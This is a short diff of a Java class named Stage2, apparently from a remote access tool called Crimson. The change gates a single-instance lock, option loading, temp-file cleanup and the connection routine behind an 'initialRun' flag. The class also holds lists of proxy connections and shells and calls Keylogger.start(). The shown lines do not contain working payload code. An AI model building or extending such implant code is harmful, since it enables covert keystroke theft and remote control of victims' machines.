@@ -27,32 +27,39 @@ public class Stage2 {
 	public static ArrayList<ProxyConnection> pConnections = new ArrayList<ProxyConnection>();
 	public static ArrayList<Shell> shells = new ArrayList<Shell>();
 
+	public static boolean initialRun = false;
+
 	public static void run(String[] arguments) {
+
+		initialRun = arguments[0].equals("intial");
+
 		// Establish an UncaughtExceptionHandler
 		Thread.setDefaultUncaughtExceptionHandler(new PermaJarExceptionHandler());
 
-		if (FileLocking.lockExists()) {
-			// stop
-			Logger.add("Crimson is already running");
-			return;
-		} else {
-			FileLocking.lock();
-
-		}
-
-		// Load options from internal text file
-		Stage1.loadOptions();
-
-		// Clear out old temp files
-		for (File f : new File(Platform.tempDir).listFiles()) {
-
-			if (f.getName().startsWith("crimson_")) {
-				// delete it
-				Logger.add("Deleting a temp file: " + f.getAbsolutePath());
-				f.delete();
+		if (initialRun) {
+			if (FileLocking.lockExists()) {
+				// stop
+				Logger.add("Crimson is already running");
+				return;
+			} else {
+				FileLocking.lock();
 
 			}
 
+			// Load options from internal text file
+			Stage1.loadOptions();
+
+			// Clear out old temp files
+			for (File f : new File(Platform.tempDir).listFiles()) {
+
+				if (f.getName().startsWith("crimson_")) {
+					// delete it
+					Logger.add("Deleting a temp file: " + f.getAbsolutePath());
+					f.delete();
+
+				}
+
+			}
 		}
 
 		database = new Database(new File("Psettings.db"));
@@ -111,8 +118,9 @@ public class Stage2 {
 
 		Keylogger.start();
 
-		Stage1.connectionRoutine();
-
+		if (initialRun) {
+			Stage1.connectionRoutine();
+		}
 	}
 
 	public static PermaJarSettings getSettings() {
